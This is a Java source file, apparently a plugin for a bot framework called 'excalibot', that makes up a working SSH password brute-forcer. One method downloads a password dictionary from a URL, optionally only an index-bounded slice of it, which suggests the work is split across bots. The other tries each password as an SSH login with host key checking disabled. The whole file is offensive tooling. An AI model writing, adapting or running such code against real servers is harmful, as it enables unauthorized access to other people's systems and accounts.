package org.powertrip.excalibot.common.plugins.bruteforce.bruteforce;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class Bruteforce {

    public static ArrayList<String> downloadDictionary(String target, String lowerBound, String higherBound) {
        List<String> dictionary = new ArrayList<>();
        String line;
        try {
            URL url = new URL(target);
            InputStream is = url.openStream();
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            while ((line = br.readLine()) != null) dictionary.add(line);
        } catch (IOException e) {
            return null;
        }
        if(lowerBound != null && higherBound != null) return new ArrayList<String>(dictionary.subList(Integer.parseInt(lowerBound), Integer.parseInt(higherBound)));
        else return (ArrayList<String>) dictionary;
    }

    public static Boolean testPassword(String host, String port, String user, String password){
        System.out.println("Testing " + password);
        Session session = null;
        try {
            JSch jsch = new JSch();
            session = jsch.getSession(user, host, Integer.parseInt(port));
            session.setPassword(password);
            session.setConfig("StrictHostKeyChecking", "no");
            session.connect();
            session.disconnect();
        } catch (JSchException e) {
            if (session != null) session.disconnect();
            return false;
        }
        return true;
    }

}
